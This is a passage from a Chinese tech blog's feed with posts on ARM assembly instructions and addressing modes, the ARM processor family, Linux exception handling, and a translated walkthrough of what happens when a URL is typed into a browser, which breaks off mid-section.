    <content type="html"><![CDATA[<p>arm汇编中的常用指令</p><span id="more"></span><h1 id="ARM-汇编指令简介"><a href="#ARM-汇编指令简介" class="headerlink" title="ARM 汇编指令简介"></a>ARM 汇编指令简介</h1><p>ARM处理器是精简指令集计算 Reduced Instruction Set Computing (RISC)的一个实例。<br>ARM指令集是基于精简指令集计算机(RISC)设计的，其指令集的译码机制相对比较简单，ARMv7-A具有32bit的ARM指令集和16&#x2F;32bit的Thumb&#x2F;Thumb-2指令集，<strong>ARM指令集的优点是执行效率高但不足之处也很明显，就是代码密度相对低一些</strong>。而作为<strong>ARM指令集子集的Thumb指令集</strong>，代码密度相对比ARM指令高，而且坚持了ARM一贯的性能优但也有一个致命的缺点就是效率低。正所谓鱼和熊掌不可兼得，这也是数字逻辑电路设计所谓的时间和空间的问题；而Thumb-2指令集多为32bit的指令，对于上述的ARM指令和Thumb指令做了一个折中，代码执行效率和密度都相对比较适中，几乎所有的ARM指令都可以条件执行，而另外两者仅有部分才具备此功能，三种指令均可相互调用，而且指令之间状态切换开销很小，几乎可以忽略。  </p><h2 id="一、ARM指令集格式"><a href="#一、ARM指令集格式" class="headerlink" title="一、ARM指令集格式"></a>一、ARM指令集格式</h2><p>基本格式： <code>&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;Rd&gt;, &lt;Rn&gt;, &#123;&lt;opcode2&gt;&#125;</code><br>&lt; &gt; 尖括号里面的指令助记符是必须的，而{}花括号里面的是可选的。<br>.opcode：比如MOV，LDR<br>.cond：即Condition，执行条件，与CPSR的条件标志位对应。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312242321279.png">  </p><p>.S：决定是否影响CPSR的值<br>.Rd：目标寄存器<br>.Rn：第一个操作数的寄存器<br>.opcode2：第二个操作数，可选，可以是立即数、寄存器、寄存器移位等  </p><h2 id="二、ARM-寻址方式"><a href="#二、ARM-寻址方式" class="headerlink" title="二、ARM 寻址方式"></a>二、ARM 寻址方式</h2><ol><li><p>立即寻址<br><code>mov r0, #1234</code><br>相当于：r0&#x3D;#1234。#开头，表示16进制时，以0x开头，如#0x1f。  </p></li><li><p>寄存器寻址<br><code>mov r0, r1</code><br>执行后，r0 &#x3D; r1。<br>NOP 操作通常为 <code>mov r0, r0</code>，对应的HEX为00 00 a0 e1</p></li><li><p>寄存器移位寻址</p></li></ol><p>寄存器移位寻址支持以下5种移位操作：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LSL</span>：逻辑左移，移位后寄存器空出的低位补<span class="hljs-number">0</span>；  <br><span class="hljs-attribute">LSR</span>：逻辑右移，移位后寄存器空出的高位补<span class="hljs-number">0</span>；  <br><span class="hljs-attribute">ASR</span>：算数右移，移位过程中，符号位保存不变，如果源操作数为正数，则移位后空出的高位补<span class="hljs-number">0</span>，否则补<span class="hljs-number">1</span>。  <br><span class="hljs-attribute">ROR</span>：循环右移，移位后，移出的低位，填入移位空出的高位。  <br><span class="hljs-attribute">RRX</span>：带扩展的循环右移，操作数右移一位，移位空出的高位，用C标志的值填充。  <br></code></pre></td></tr></table></figure><p><code>mov r0, r1, lsl #2</code><br>相当于：r0 &#x3D; r1&lt;&lt;2 &#x3D; r1*4。  </p><ol start="4"><li><p>寄存器间接寻址<br><code>ldr r0, [r1]</code> &#x2F;&#x2F; 取值<br>相当于：r0 &#x3D; *r1。  </p></li><li><p>基址寻址<br><code>ldr r0, [r1, #-4]</code>  将内存中的数据加载到寄存器中load to register<br>相当于：r0 &#x3D; *(r1 - 4)。<br>与之相对应的指令是<br><code>str r0 [r1, #-1]</code>   将寄存器中的数据加载到内存中</p></li><li><p>多寄存器寻址<br><code>lmdia r0, &#123;r1, r2, r3, r4&#125;</code><br>LDM 是数据加载指令，指令的后缀IA表示，每次执行完成加载操作后，R0寄存器的值自增1个字。<br>R1&#x3D;[R0], R2&#x3D;[R0+#4], R3&#x3D;[R0+#8], R4&#x3D;[R0+#12]<br>字表示一个32位的数值。  </p></li><li><p>堆栈寻址<br>它需要特定的指令完成：<br>LMDFA&#x2F;STMFA, LDMEA&#x2F;STMEA, LDMFD&#x2F;SDMFD, LDMED&#x2F;STMED。<br>LMD&#x2F;STM 表示多寄存器寻址，一次可以传送多个寄存器值。<br>FA&#x2F;EA&#x2F;FD&#x2F;ED ..参考指令集。<br><code>stmfd sp!, &#123;r1-r7, lr&#125;   @将 r1~r7, lr 压栈</code> 多用于保存子程序现场。<br><code>ldmfd sp!, &#123;r1~r7, lr&#125;   @将 r1~r7, lr 出栈，放入 r1~r7, lr</code> 多用于恢复子程序现场。  </p></li><li><p>块拷贝寻址<br>可实现连续地址数据从存储器的某一位置拷贝至另一位置。<br>LDMIA&#x2F;STMIA, LDMDA&#x2F;STMDA, LDMIB&#x2F;STMIB, LDMDB&#x2F;STMDB。<br>LDM&#x2F;SDM 表示多寄存器寻址，一次可以传送多个寄存器值。<br>IA, DA, IB, DB ..参考指令集。<br><code>ldmia r0!, &#123;r1-r3&#125;  @ 从r0指向的区域的值取出来，放到r1-r3中</code><br><code>stmia r0!, &#123;r1-r3&#125;  @ 将r1-r3的值取出来，放入r0指向的区域</code>    </p></li><li><p>相对寻址<br>相对寻址以PC的当前值为基址，与偏移值相加，得到最终的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">bl .lc0<br>    ...<br>.lc0:<br>    ...<br></code></pre></td></tr></table></figure><p>bl 直接跳到 .lc0 处。</p></li></ol><h2 id="三、ARM汇编指令分类"><a href="#三、ARM汇编指令分类" class="headerlink" title="三、ARM汇编指令分类"></a>三、ARM汇编指令分类</h2><p>包括存储加载类指令集，数据处理类指令集，分支跳转类指令集，程序状态寄存器访问指令以及协处理器类指令集</p><ol><li><p>存储加载类<br>由于ARM处理器采用了统一编址技术，因而对外围I&#x2F;O，程序数据的访问都要通过加载&#x2F;存储(Load&#x2F;Store)指令来进行。ARM的加载&#x2F;存储指令(LDR，STR)是可以实现字，半字，无符号，有符号字节操作；<br>批量加载&#x2F;存储(LDM，STM)可以实现一条指令加载存储多个存储器的内容，加载效率大为提高，一般用来传递参数和复制数据，可以说是一般加载&#x2F;存储的加强版。<br>ARM采用RISC架构，CPU本身不能直接读取内存，而需要先将内存中内容加载入CPU中通用寄存器中才能被CPU处理，ldr&#x2F;str组合用来实现 ARM CPU和内存数据交换。<br>LDR：用于从内存中读取数据加载到内存中；比如 LDR R0, [R1] 表示将R1所指向的存储单元的内容加到R0寄存器中。<br>STR：将寄存器中的数据保存到内存单元；STR R0, [R1] 将R0寄存器里面的数据保存到R1所指向的内存中。<br>LDM：实现一块连续的内存单元的数据加载多个寄存器中。<br>STM：实现在多个寄存器的数据保存到一块连续的内存单元之中。<br>格式：<code>LDM/STM  &#123;cond&#125; &lt;mode&gt; Rn&#123;!&#125; &#123;reglist&#125; &#123;^&#125;</code><br>.cond：同上<br>.mode：地址变化模式共8种。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312242321601.png"><br>.Rn：基址寄存器，不允许是R15。<br>.!：感叹号表示是否将最后的地址存入Rn。<br>.Reglist：寄存器列表，按从小到大的顺序排列，当标号连续时可用’-‘连接，{R0-R3}，不连续时用逗号连接。<br>.”^”：(假如寄存器列表含有PC寄存器R15)表示指令执行后SPSR的值自动复制给CPSR，常用于从中断处理函数中返回。<br>反之，默认操作的是用户模式下的寄存器，并非当前特殊模式的寄存器。  </p></li><li><p>数据处理类指令集<br>包括数据传送指令MOV，算术逻辑运算符ADD，SUB，BIC，ORR，比较指令CMP，TST等<br>算术  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asm">ADD op1+op2<br>ADC op1+op2+carry<br>SUB op1-op2+carry-1<br>ADR：ADR指令被编译器用一条ADD或者SUB进行替换，在ARM状态下，字对齐时加载范围是-1020~1020，字节或者半字对齐时是-255~255。<br>ADRL：被编译器用两条条ADD或者SUB进行替换，在ARM状态下，字对齐时加载范围是-256K~256K，字节或者半字对齐时是-64K~264K。<br>syntax : &lt;operation&gt; &#123;&lt;cond&gt;&#125;&#123;S&#125; Rd,Rn,operand<br>examples :<br>ADD r0,r1,r2<br>ADDS R0, R1, #1 @指令执行后可能会影响CPSR的条件标志位。<br>SUB R1,R2,#1<br>例：通过LDR伪指令，完成GPIO的配置功能,将0xE0200280赋给R1<br>LDR R1, =0xE0200280<br>LDR R0, =0x00001111<br>STR R0, [R1]<br>```  <br>比较  <br>``` asm<br>CMP op1-op2<br>TST op1 &amp; op2<br>TEQ op1 ^ op2<br>SWP &#123;cond&#125; &#123;B&#125; Rd, Rm, [Rn]：将Rn指向的内容加载到目标寄存器Rd，Rm为源寄存器，将该寄存器的数据存储到Rn指向的地址单元。<br>TST &#123;cond&#125; Rn, opcode2 ： 将Rn的值与opcode2进行按位与操作，根据结果更新CPSR标志位。<br>CMP &#123;cond&#125; Rn opcode2 ： 将Rn的值减opcode2,根据操作结果更新相应CPSR的标志位。以便后面的指令判断是否执行。<br>Syntax : &lt;operation&gt; &#123;&lt;cond&gt;&#125; Rn,Op<br>examples :<br>CMP R0,R1<br>CMP R0,#2<br></code></pre></td></tr></table></figure><p>逻辑运算  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">AND op1,op2<br>EOR op1,op2<br>ORR op1,op2 #oxF@将R0的后4位置1（与&quot;1&quot;做或运算，实现置1功能），结果保存到R0<br>BIC R0, R2， #0xF@将R2的后4位置清零<br></code></pre></td></tr></table></figure><p>移动  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">MOV op1,op2<br>syntax : &lt;Operation&gt;&#123;&lt;cond&gt;&#125;&#123;S&#125; Rn, Op2<br>Examples:<br>MOV r0, r1<br></code></pre></td></tr></table></figure></li><li><p>分支跳转指令</p></li></ol><p>当程序需要一些循环、过程（procedures）和函数的时候，会用到分支指令。<br>实现程序跳转的方法，还可以直接给PC寄存器直接赋值实现跳转。  </p><p>B<br>Branch, 分支。<br>该指令不会影响LR寄存器。这意味着一旦我们跳转到子程序（subroutine），不能回溯（traceback）我们曾经在哪儿。这个类似于x86汇编中的JMP指令。  </p><p><code>BNE LABEL</code><br>表示不为0时，则跳转到LABEL处执行。  </p><p>BL<br>BL Branch with Link，带链接的分支。<br>该指令可以让子程序调用，通过LR保存的PC-4的地址，从子程序返回，只需简单的从LR还原PC的值：<code>mov pc, lr</code>。  </p><p>BX 和 BLX<br>BX Branch with Exchange，带交换的分支。<br>BLX Branch with Link and Exchange，带链接和交换的分支。<br>BX和BLX指令用于THUMB模式中，暂时不关注。  </p><ol start="4"><li>程序状态寄存器访问指令<br>通过MSR和MRS配合使用实现对PSR寄存器的访问，通过读-修改-写操作来实现开关中断，切换处理器模式。<br>.MRS：读程序状态寄存器指令，将PSR中的内容读入到寄存器中 <code>MRS &#123;cond&#125; Rd, PSR</code> 。<br>.MSR：写程序状态寄存器指令 <code>MSR &#123;cond&#125; psr_fields #immed_8MSR &#123;cond&#125; psr_fields, Rm</code>。field指位域，只有在特权模式下才能对PSR进行修改，例如切换到管理模式：<code>MSR CPSR_c #0xD3</code>,将0xD3写入CPSR的低8位，此时M[4:0]&#x3D;0b10011，进入管理模式。<br>用读-修改-写操作切换到管理模式  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">MRS R0, CPSR @读出CPSR的值<br>BIC R0, R0, #0x1F @清0<br>ORR R0, R0, #0xD3 @修改模式<br>MSR CPSR_cxsf, R0 @将修改后的值保存到CPSR<br></code></pre></td></tr></table></figure></li><li>协处理器访问指令<br>协处理器CP15包含了16个32bit的寄存器，主要用于存储管理。<br>.MCR：ARM寄存器到协处理器的数据传送指令 <code>MCR &#123;cond&#125; P15, 0, Rd, CRn, CRm, &#123;opcode2&#125;</code><br>Rd：源寄存器<br>CRn：协处理器中的寄存器，目标寄存器，存放第一个操作数其编号为C0,C1….C15<br>.MRC：协处理器到ARM寄存器的数据传送指令<br>Rd：目标寄存器<br>CRn：协处理器中的寄存器，源寄存器，存放第一个操作数其编号为C0,C1….C15<br>CRm：附加的源寄存器，不需要其他信息时CRm为C0<br>opcode2：提供附加信息，若为空时，指定为0即可</li></ol>]]></content>
    
    
    <categories>
      
      <category>arm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arm家族</title>
    <link href="/2023/12/22/arm%E5%AE%B6%E6%97%8F/"/>
    <url>/2023/12/22/arm%E5%AE%B6%E6%97%8F/</url>
    
    <content type="html"><![CDATA[<p>ARM7、ARM9、s3c2410、STM32、Cortex-M3它们之间有什么关联和区别？</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看到 ARM9 数字9比较大，你是不认为它更牛？</p><p>看到很多资料都是基于 s3c2410，你是不认为它现在还比较流行？</p><p>如果时间倒退10年，ARM9、 s3c2410确实算是比较流行的年代。为什么这么说呢，因为他们是ARM之前的一批处理器。</p><p>本文来回顾一下ARM的各种处理器，以及ARM7、ARM9、s3c2410、STM32、Cortex-M3它们之间有什么关联和区别？</p><h1 id="ARM命名规则"><a href="#ARM命名规则" class="headerlink" title="ARM命名规则"></a>ARM命名规则</h1><p>ARM的命名规则有点复杂，早期和现在的命名规则有点变化。对于普通人，只需要了解几个大的命名规则即可。</p><p>ARM的命名分为<strong>指令集架构、 处理器架构、 处理器型号</strong>三类命名规则：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312221638237.png"></p><p>1.指令集架构</p><p>指令集架构命名格式: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Armv + [n] + [variants] + [x(variants)]<br></code></pre></td></tr></table></figure><blockquote><p>Armv：固定字符, 即ARM Version <br><br><br>n：指令集版本号, 迄今为之, ARM架构版本发布了9个系列, 所以n&#x3D;[1~9]<br><br><br>variants：变种<br><br><br>x(variants)：表示不支持x后指定的变种<br></p></blockquote><p>大版本：ARMv1 ~ ARMv9<br>然后可以进一步划分，比如：ARMv8-A、 ARMv8-R、 ARMv8-M<br>ARMv9架构是今年（2021年）才推出的，将有更多系列处理器。</p><p><strong>arm后面接个<code>v</code>的都是指令集架构</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312221648068.png"></p><p>从<code>armv6</code>开始出现了<code>Cortex</code>系列，之前是没有的。</p><br>2.处理器架构（系列）自ARMv6架构开始，ARM根据处理器的性能和应用场景把处理器进一步划分为：Cortex-M、 Cortex-R、 Cortex-A三种不同类别的处理器系列。<br><ul><li><code>M</code>主要是低端市场，其实就是一个性能好一点的单片机</li></ul><br><ul><li><code>R</code>主要用于实时性强的情况</li></ul><br><ul><li><code>A</code>高端芯片，可以看作是cpu。现在的主流手机大部分都是使用这个系列的内核</li></ul><p>早期的处理器其实没有进行这一步大分类。</p><p>3.处理器型号<br>这里的处理器型号和我们直接的处理器型号（比如：STM32F103ZET6）有区别，这里是站在ARM的角度来说。</p><p>早期（ARMv6之前）的处理器型号命名规则：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ARM + [x][y][z] + [varians]<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>x：处理器系列, 有6, 7, 9 , 11等多个系列<br>y：存储管理&#x2F;保护单元<br>z：cache</p><p>variants有以下字母可选：<br>T：支持Thumb指令集<br>D：支持片上调试<br>M：支持快速乘法器<br>I：支持Embedded ICE, 支持嵌入式跟踪调试<br>E：支持增强型DSP指令<br>J：支持Jazelle<br>(F)：具备向量浮点单元VFP<br>-S：可综合版本</p>          </div><p>比如：ARM926, 属于ARMv5指令集架构的, CPU是ARM9系列的, 具备2个存储管理&#x2F;保护单元, 6个 Cache。</p><p>ARMv6及之后的处理器型号就是现在大家比较熟悉的了，比如：</p><ul><li><p>Cortex-M0、Cortex-M3、Cortex-M4</p></li><li><p>Cortex-R4、 Cortex-R5</p></li><li><p>Cortex-A55、 Cortex-A73</p></li></ul><p>再放一张图：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312221641384.png"></p><h1 id="处理器的区别"><a href="#处理器的区别" class="headerlink" title="处理器的区别"></a>处理器的区别</h1><p>了解ARM处理器命名规则之后，再来看ARM7、ARM9、s3c2410、STM32、Cortex-M3它们之间的区别。</p><h2 id="1-ARM7"><a href="#1-ARM7" class="headerlink" title="1.ARM7"></a>1.ARM7</h2><p>ARM7是一个处理器系列（大版本，或者说ARM7家族），其中包含很多种类的处理器。</p><p>大多数都采用 ARMv4T核心架构，但也有部分处理器采取ARMv3或ARMv5TEJ核心。这个系列采用冯纽曼架构。</p><p>ARM7系列于1993年问世，经典的ARM7处理器有ARM7TDMI、 ARM7EJ-S等。（STM32早期的产品STM7，也是采用 ARM7TDMI 32位 RISC内核）</p><h2 id="2-ARM9-和-s3c2410"><a href="#2-ARM9-和-s3c2410" class="headerlink" title="2.ARM9 和 s3c2410"></a>2.ARM9 和 s3c2410</h2><p>ARM7之后就是ARM9，其实还有一个过渡产品ARM8（就像Win7直接跳到Win10一样）。</p><p>ARM9在我读书那会儿都还比较流行，包括现在还有很多关于 ARM9 的学习资料。</p><p>图片</p><p>经典的 s3c2410 其实就是一款基于 ARM920T 内核的处理器，继S3C2410之后的S3C2416、 S3C2440等可以说学习嵌入式Linux的同学都知道他们的存在，包括市面上很多Linux开发板和资料都是基于这几款处理器而设计。</p><p>目前嵌入式Linux开发板很多都是基于NXP 的iMX.6处理器（Cortex-A9）。</p><h2 id="3-STM32-和-Cortex-M3"><a href="#3-STM32-和-Cortex-M3" class="headerlink" title="3.STM32 和 Cortex-M3"></a>3.STM32 和 Cortex-M3</h2><p>STM32可以说学习单片机和嵌入式开发的朋友都比较熟悉了，它是ST（意法半导体）公司基于 Cortex-M内核的处理器，包含多个系列（STM32F0、 F1、 F4、L0、 L1、 G0、 G4等）。</p><p>Cortex-M3只是一个ARM处理器的内核，很多半导体公司都基于Cortex-M3内核开发自己的产品。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://mp.weixin.qq.com/s/wZaUN_yYEL8sOM119NmtSw">https://mp.weixin.qq.com/s/wZaUN_yYEL8sOM119NmtSw</a></p>]]></content>
    
    
    <categories>
      
      <category>arm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arm汇编总结</title>
    <link href="/2023/12/22/arm%E6%B1%87%E7%BC%96%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/22/arm%E6%B1%87%E7%BC%96%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>总结arm汇编的知识点</p><span id="more"></span><h1 id="基础寄存器"><a href="#基础寄存器" class="headerlink" title="基础寄存器"></a>基础寄存器</h1>]]></content>
    
    
    <categories>
      
      <category>arm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux异常处理</title>
    <link href="/2023/12/18/Linux%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    <url>/2023/12/18/Linux%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>总结Linux中的异常</p><span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在Linux中，异常主要被包含为：</p><table><thead><tr><th>类别</th><th>原因</th><th>异步&#x2F;同步</th><th>返回行为</th></tr></thead><tbody><tr><td>中断</td><td>来自I&#x2F;O设备的信号</td><td>异步</td><td>总是返回到下一条指令</td></tr><tr><td>陷阱</td><td>故意的异常</td><td>同步</td><td>总是返回到下一条指令</td></tr><tr><td>故障</td><td>潜在的可恢复的错误</td><td>同步</td><td>可能会返回到下一条指令</td></tr><tr><td>终止</td><td>错误指令</td><td>同步</td><td>报错</td></tr></tbody></table><p><strong>需要注意的是，在有些资料（Intel手册）中会区分异步中断和同步异常。</strong></p><p>所以还会有另外一种分类方式</p><ul><li>异常：这个异常就包含了上面的同步异常</li><li>中断：就是上面分类的中断，异步中断</li></ul><hr><h1 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h1><p>中断是由硬件产生的，而不是由于某条指令产生的。在这个角度上说中断是<strong>异步的</strong>，处理中断的程序称之为中断处理程序。</p><h2 id="中断的产生过程"><a href="#中断的产生过程" class="headerlink" title="中断的产生过程"></a>中断的产生过程</h2><p>执行完当前指令后，处理器发现某一个引脚的电平发生变化。然后通过一个可编程中断控制器（PIC）来进行控制，PIC连接着中断请求线（IRQ Interrupt ReQuest线）。</p><p>PIC通过监视IRQ线来掌握是否有中断的产生。由于计算机的发展，现在的计算机都不止一个cpu。相应的，PIC也升级为APIC（高级可编程中断控制器）。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312181830646.png"></p><p>这是使用APIC的情况。</p><hr><h1 id="陷阱"><a href="#陷阱" class="headerlink" title="陷阱"></a>陷阱</h1><p>陷阱是故意的异常，通常使用于系统调用、程序调试等地方。</p><hr><h1 id="中断描述符表-IDT"><a href="#中断描述符表-IDT" class="headerlink" title="中断描述符表(IDT)"></a>中断描述符表(IDT)</h1><p>这个表的地址存储在中断描述符表寄存器(idtr)中，这个表一共包含了三种数据结构，这三种数据结构分别称之为：</p><ul><li>任务门</li><li>中断门</li><li>陷阱门</li></ul><p>这三种门分别用于处理对应的任务。</p><h2 id="IDT的初始化"><a href="#IDT的初始化" class="headerlink" title="IDT的初始化"></a>IDT的初始化</h2><p>当计算机运行在实模式下时，IDT必须被初始化并由BIOS使用。但是一旦Linux接管后，这个IDT就会被Linux移动到ARM的某个区域中，并且进行第二次初始化。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>异常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当···时发生了什么？</title>
    <link href="/2023/12/13/%E5%BD%93%C2%B7%C2%B7%C2%B7%E6%97%B6%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <url>/2023/12/13/%E5%BD%93%C2%B7%C2%B7%C2%B7%E6%97%B6%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<p>回答一个经典问题。</p><span id="more"></span><h1 id="当···时发生了什么？"><a href="#当···时发生了什么？" class="headerlink" title="当···时发生了什么？"></a>当···时发生了什么？</h1><p>这个仓库试图回答一个古老的面试问题：当你在浏览器中输入 google.com 并且按下回车之后发生了什么？</p><p>不过我们不再局限于平常的回答，而是想办法回答地尽可能具体，不遗漏任何细节。</p><p>这将是一个协作的过程，所以深入挖掘吧，并且帮助我们一起完善它。仍然有大量的细节等待着你来添加，欢迎向我们发送 Pull Requset！</p><p>这些内容使用 <code>Creative Commons Zero</code>_ 协议发布。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>.. contents::<br>   :backlinks: none<br>   :local:</p><h2 id="按下”g”键"><a href="#按下”g”键" class="headerlink" title="按下”g”键"></a>按下”g”键</h2><p>接下来的内容介绍了物理键盘和系统中断的工作原理，但是有一部分内容却没有涉及。当你按下“g”键，浏览器接收到这个消息之后，会触发自动完成机制。浏览器根据自己的算法，以及你是否处于隐私浏览模式，会在浏览器的地址框下方给出输入建议。大部分算法会优先考虑根据你的搜索历史和书签等内容给出建议。你打算输入 “google.com”，因此给出的建议并不匹配。但是输入过程中仍然有大量的代码在后台运行，你的每一次按键都会使得给出的建议更加准确。甚至有可能在你输入之前，浏览器就将 “google.com” 建议给你。</p><h2 id="回车键按下"><a href="#回车键按下" class="headerlink" title="回车键按下"></a>回车键按下</h2><p>为了从零开始，我们选择键盘上的回车键被按到最低处作为起点。在这个时刻，一个专用于回车键的电流回路被直接地或者通过电容器间接地闭合了，使得少量的电流进入了键盘的逻辑电路系统。这个系统会扫描每个键的状态，对于按键开关的电位弹跳变化进行噪音消除(debounce)，并将其转化为键盘码值。在这里，回车的码值是13。键盘控制器在得到码值之后，将其编码，用于之后的传输。现在这个传输过程几乎都是通过通用串行总线(USB)或者蓝牙(Bluetooth)来进行的，以前是通过PS&#x2F;2或者ADB连接进行。</p><p><em>USB键盘：</em></p><ul><li><p>键盘的USB元件通过计算机上的USB接口与USB控制器相连接，USB接口中的第一号针为它提供了5V的电压</p></li><li><p>键码值存储在键盘内部电路一个叫做”endpoint”的寄存器内</p></li><li><p>USB控制器大概每隔10ms便查询一次”endpoint”以得到存储的键码值数据，这个最短时间间隔由键盘提供</p></li><li><p>键值码值通过USB串行接口引擎被转换成一个或者多个遵循低层USB协议的USB数据包</p></li><li><p>这些数据包通过D+针或者D-针(中间的两个针)，以最高1.5Mb&#x2F;s的速度从键盘传输至计算机。速度限制是因为人机交互设备总是被声明成”低速设备”（USB 2.0 compliance）</p></li><li><p>这个串行信号在计算机的USB控制器处被解码，然后被人机交互设备通用键盘驱动进行进一步解释。之后按键的码值被传输到操作系统的硬件抽象层</p></li></ul><p><em>虚拟键盘（触屏设备）：</em></p><ul><li><p>在现代电容屏上，当用户把手指放在屏幕上时，一小部分电流从传导层的静电域经过手指传导，形成了一个回路，使得屏幕上触控的那一点电压下降，屏幕控制器产生一个中断，报告这次“点击”的坐标</p></li><li><p>然后移动操作系统通知当前活跃的应用，有一个点击事件发生在它的某个GUI部件上了，现在这个部件是虚拟键盘的按钮</p></li><li><p>虚拟键盘引发一个软中断，返回给OS一个“按键按下”消息</p></li><li><p>这个消息又返回来向当前活跃的应用通知一个“按键按下”事件</p></li></ul><h2 id="产生中断-非USB键盘"><a href="#产生中断-非USB键盘" class="headerlink" title="产生中断[非USB键盘]"></a>产生中断[非USB键盘]</h2><p>键盘在它的中断请求线(IRQ)上发送信号，信号会被中断控制器映射到一个中断向量，实际上就是一个整型数 。CPU使用中断描述符表(IDT)把中断向量映射到对应函数，这些函数被称为中断处理器，它们由操作系统内核提供。当一个中断到达时，CPU根据IDT和中断向量索引到对应的中断处理器，然后操作系统内核出场了。</p><h2 id="Windows-一个-WM-KEYDOWN-消息被发往应用程序"><a href="#Windows-一个-WM-KEYDOWN-消息被发往应用程序" class="headerlink" title="(Windows)一个 WM_KEYDOWN 消息被发往应用程序"></a>(Windows)一个 <code>WM_KEYDOWN</code> 消息被发往应用程序</h2><p>HID把键盘按下的事件传送给 <code>KBDHID.sys</code> 驱动，把HID的信号转换成一个扫描码(Scancode)，这里回车的扫描码是 <code>VK_RETURN(0x0d)</code>。 <code>KBDHID.sys</code> 驱动和 <code>KBDCLASS.sys</code> (键盘类驱动,keyboard class driver)进行交互，这个驱动负责安全地处理所有键盘和小键盘的输入事件。之后它又去调用 <code>Win32K.sys</code> ，在这之前有可能把消息传递给安装的第三方键盘过滤器。这些都是发生在内核模式。</p><p><code>Win32K.sys</code> 通过 <code>GetForegroundWindow()</code> API函数找到当前哪个窗口是活跃的。这个API函数提供了当前浏览器的地址栏的句柄。Windows系统的”message pump”机制调用 <code>SendMessage(hWnd, WM_KEYDOWN, VK_RETURN, lParam)</code> 函数， <code>lParam</code> 是一个用来指示这个按键的更多信息的掩码，这些信息包括按键重复次数（这里是0），实际扫描码（可能依赖于OEM厂商，不过通常不会是 <code>VK_RETURN</code> ），功能键（alt, shift, ctrl）是否被按下（在这里没有），以及一些其他状态。</p><p>Windows的 <code>SendMessage</code> API直接将消息添加到特定窗口句柄 <code>hWnd</code> 的消息队列中，之后赋给 <code>hWnd</code> 的主要消息处理函数 <code>WindowProc</code> 将会被调用，用于处理队列中的消息。</p><p>当前活跃的句柄 <code>hWnd</code> 实际上是一个edit control控件，这种情况下，<code>WindowProc</code> 有一个用于处理 <code>WM_KEYDOWN</code> 消息的处理器，这段代码会查看 <code>SendMessage</code> 传入的第三个参数 <code>wParam</code> ，因为这个参数是 <code>VK_RETURN</code> ，于是它知道用户按下了回车键。</p><h2 id="Mac-OS-X-一个-KeyDown-NSEvent被发往应用程序"><a href="#Mac-OS-X-一个-KeyDown-NSEvent被发往应用程序" class="headerlink" title="(Mac OS X)一个 KeyDown NSEvent被发往应用程序"></a>(Mac OS X)一个 <code>KeyDown</code> 